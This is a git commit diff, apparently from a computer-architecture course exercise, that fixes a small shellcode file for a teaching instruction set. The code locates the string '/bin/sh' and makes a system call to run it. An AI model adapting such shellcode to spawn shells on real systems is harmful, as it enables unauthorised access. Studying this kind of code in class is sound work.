b7122ee5c2c32c5c83ecb0f50a40231708bc266e
Jack Heidal <jpheidal@gmail.com>
2020-11-05 18:07:17 -0800

    fixed shellcode

--- code/shellcode.s
+++ code/shellcode.s
@@ -1,5 +1,7 @@
-gpc $6, r0  # r0 = location of /bin/sh
-ld  $8, r1  # r1 = length of /bin/sh
-sys $2      # run /bin/sh
-.long 0x2f62696e
-.long 0x2f736800
+.pos 0x0
+                 gpc  $0x8, r0            # r0 = location of /bin/sh
+                 ld   $0x8, r1            # r1 = length of /bin/sh
+                 sys  $2                  # run /bin/sh
+.pos 0xa
+                 .long 0x2f62696e
+                 .long 0x2f736800
